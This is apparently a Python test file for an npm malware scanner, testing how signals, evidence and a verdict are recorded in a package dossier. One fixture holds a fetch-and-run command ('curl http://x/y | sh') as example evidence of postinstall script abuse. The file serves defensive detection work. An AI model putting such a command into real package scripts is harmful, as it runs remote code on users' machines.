import pytest

from malwhunter.dossier.model import Dossier, Evidence, Severity, Signal, SignalSource, signal_id


def _signal(**overrides) -> Signal:
    defaults = dict(
        id="s1",
        source=SignalSource.RECON,
        category="lifecycle-script-abuse",
        severity=Severity.HIGH,
        description="postinstall pipes a remote script into sh",
        evidence=[Evidence(excerpt="curl http://x/y | sh", file="package.json", line=7)],
    )
    defaults.update(overrides)
    return Signal(**defaults)


def test_signal_requires_evidence():
    with pytest.raises(ValueError, match="no evidence"):
        Signal(
            id="s1",
            source=SignalSource.RECON,
            category="lifecycle-script-abuse",
            severity=Severity.HIGH,
            description="x",
            evidence=[],
        )


def test_signal_id_is_stable_for_same_inputs():
    a = signal_id(SignalSource.RECON, "lifecycle-script-abuse", "package.json:7")
    b = signal_id(SignalSource.RECON, "lifecycle-script-abuse", "package.json:7")
    assert a == b


def test_signal_id_differs_by_category():
    a = signal_id(SignalSource.RECON, "lifecycle-script-abuse", "x")
    b = signal_id(SignalSource.RECON, "eval-computed-arg", "x")
    assert a != b


def test_dossier_key_format():
    d = Dossier(package="left-pad", version="1.3.0")
    assert d.dossier_key == "npm:left-pad@1.3.0"


def test_dossier_to_dict_includes_computed_verdict():
    d = Dossier(package="evil-pkg", version="1.0.0")
    d.add_signal(_signal(severity=Severity.CRITICAL, category="canary-exfiltration"))
    out = d.to_dict()
    assert out["verdict"] == "malicious"
    assert len(out["signals"]) == 1
